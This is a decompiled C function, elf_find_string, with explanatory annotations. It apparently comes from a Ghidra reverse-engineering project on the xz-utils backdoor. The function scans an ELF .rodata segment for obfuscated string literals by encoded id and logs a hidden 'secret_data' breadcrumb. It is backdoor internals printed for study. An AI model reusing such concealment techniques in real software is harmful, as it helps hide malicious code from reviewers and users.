// /home/kali/xzre-ghidra/xzregh/1020A0_elf_find_string.c
// Function: elf_find_string @ 0x1020A0
// Calling convention: __stdcall
// Prototype: char * __stdcall elf_find_string(elf_info_t * elf_info, EncodedStringId * stringId_inOut, void * rodata_start_ptr)


/*
 * AutoDoc: Scans the cached `.rodata` window for encoded literals. After logging telemetry it asks `elf_get_rodata_segment` for the base/span (bailing if the segment is shorter than 0x2c bytes), optionally clamps the starting cursor to `rodata_start_ptr`, and then advances one byte at a time calling `get_string_id(cursor, rodata_end)`. If `*stringId_inOut` is zero the first non-zero id wins and is written back; otherwise the search continues until the requested id reappears.
 *
 * The return value is the pointer where the literal begins, making it easy to resume subsequent scans or correlate the literal with code references.
 */
#include "xzre_types.h"

char * elf_find_string(elf_info_t *elf_info,EncodedStringId *stringId_inOut,void *rodata_start_ptr)

{
  BOOL telemetry_ok;
  EncodedStringId candidate_id;
  char *string_begin;
  char *string_end;
  u64 rodata_span[2];
  
  // AutoDoc: Skip the expensive rodata walk entirely when the secret-data logger rejects the breadcrumb.
  telemetry_ok = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xb6,7,10,FALSE);
  if (telemetry_ok != FALSE) {
    rodata_span[0] = 0;
    string_begin = (char *)elf_get_rodata_segment(elf_info,rodata_span);
    if ((string_begin != (char *)0x0) && (0x2b < rodata_span[0])) {
      string_end = string_begin + rodata_span[0];
      // AutoDoc: Let callers resume from a previous offset or clamp the scan to a sub-range of `.rodata`.
      if (rodata_start_ptr != (void *)0x0) {
        if (string_end <= rodata_start_ptr) {
          return (char *)0x0;
        }
        if (string_begin < rodata_start_ptr) {
          string_begin = (char *)rodata_start_ptr;
        }
      }
      for (; string_begin < string_end; string_begin = string_begin + 1) {
        candidate_id = get_string_id(string_begin,string_end);
        if (candidate_id != 0) {
          // AutoDoc: Treat a zero id as "take the first literal we decode"; otherwise demand an exact id match.
          if (*stringId_inOut == 0) {
            *stringId_inOut = candidate_id;
            return string_begin;
          }
          if (*stringId_inOut == candidate_id) {
            return string_begin;
          }
        }
      }
    }
  }
  return (char *)0x0;
}

